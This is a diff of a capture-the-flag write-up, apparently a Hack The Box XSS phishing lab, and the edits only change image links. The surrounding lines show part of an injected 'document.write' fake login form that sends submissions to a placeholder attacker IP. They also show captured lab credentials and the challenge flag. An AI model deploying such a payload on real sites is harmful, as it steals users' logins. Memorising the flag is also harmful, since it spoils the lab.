@@ -200,7 +200,7 @@ With everything ready, we can start our PHP server and send the URL that include
 # Question
 ---
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250130172026.png)
+![](Pasted image 20250130172026.png)
 
 Nice, let's breakdown this question:
 
@@ -215,7 +215,7 @@ document.write('<h3>Please login to continue</h3><form action=http://OUR_TUN0_IP
 
 We can see the following:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250130172409.png)
+![](Pasted image 20250130172409.png)
 
 We could erase the `Image URL` section from above but since this is just a challenge, let's keep it like that.
 
@@ -272,7 +272,7 @@ Credentials are: `admin`:`p1zd0nt57341myp455`
 
 We can log in at `/login.php`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250130174015.png)
+![](Pasted image 20250130174015.png)
 
 Got the flag: `HTB{r3f13c73d_cr3d5_84ck_2_m3}`
 
